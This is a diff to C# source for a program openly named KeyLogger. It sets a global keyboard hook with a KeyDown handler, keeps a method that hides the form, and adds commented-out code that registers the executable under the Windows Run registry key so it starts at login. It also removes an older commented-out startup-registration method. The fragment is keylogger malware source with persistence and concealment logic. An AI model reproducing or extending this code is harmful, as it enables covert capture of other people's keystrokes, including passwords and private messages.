@@ -14,6 +14,11 @@ namespace KeyLogger
         [STAThread]
         static void Main()
         {
+            // The path to the key where Windows looks for startup applications
+            //RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            // Add the value in the registry so that the application runs at startup
+            //rkApp.SetValue("MyApp", Application.ExecutablePath.ToString());
+
             GlobalKeyboardHook gHook = GlobalKeyboardHook.getInstance();
             // Declare a KeyDown Event
             gHook.KeyDown += new KeyEventHandler(gHook_KeyDown);
@@ -66,24 +71,6 @@ namespace KeyLogger
         {
             if (Control.ModifierKeys != Keys.Shift) KeyboardStatus.setShiftFlag(false);
         }
-
-
-        /*
-        private void RegisterInStartup(bool isChecked)
-        {
-            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey
-                    ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-            if (isChecked)
-            {
-                registryKey.SetValue("ApplicationName", Application.ExecutablePath);
-            }
-            else
-            {
-                registryKey.DeleteValue("ApplicationName");
-            }
-        }
-        */
-    
 
         public static void hideForm()
         {
